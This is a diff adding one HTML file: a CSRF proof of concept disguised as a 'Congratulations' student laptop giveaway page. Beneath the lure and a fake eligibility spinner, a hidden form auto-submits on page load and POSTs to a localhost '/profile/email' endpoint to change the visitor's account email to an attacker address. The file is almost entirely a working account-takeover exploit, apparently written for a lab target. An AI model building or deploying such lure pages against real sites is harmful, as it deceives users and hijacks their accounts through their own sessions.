@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Congratulations! Special Campus Giveaway</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      text-align: center;
+      padding: 60px 20px;
+      background: #f8fafc;
+      color: #1e293b;
+    }
+    .card {
+      max-width: 500px;
+      margin: 0 auto;
+      background: #fff;
+      padding: 40px 30px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+    }
+    h1 { color: #2563eb; margin-bottom: 16px; font-size: 1.8rem; }
+    p { color: #64748b; font-size: 1.05rem; line-height: 1.6; }
+    .loader {
+      margin: 24px auto;
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #2563eb;
+      border-radius: 50%;
+      width: 36px;
+      height: 36px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>🎉 Congratulations!</h1>
+    <p>You have been randomly selected for our student developer laptop giveaway!</p>
+    <div class="loader"></div>
+    <p style="font-size: 0.9rem;">Verifying your prize eligibility, please wait a moment...</p>
+  </div>
+
+  <!-- Hidden CSRF Form targeting http://localhost:3000/profile/email -->
+  <form id="csrfForm" action="http://localhost:3000/profile/email" method="POST" style="display: none;">
+    <input type="hidden" name="email" value="attacker@pwned.com">
+  </form>
+
+  <script>
+    // Silently auto-submits form with current user's session cookie
+    window.addEventListener('DOMContentLoaded', () => {
+      document.getElementById('csrfForm').submit();
+    });
+  </script>
+</body>
+</html>
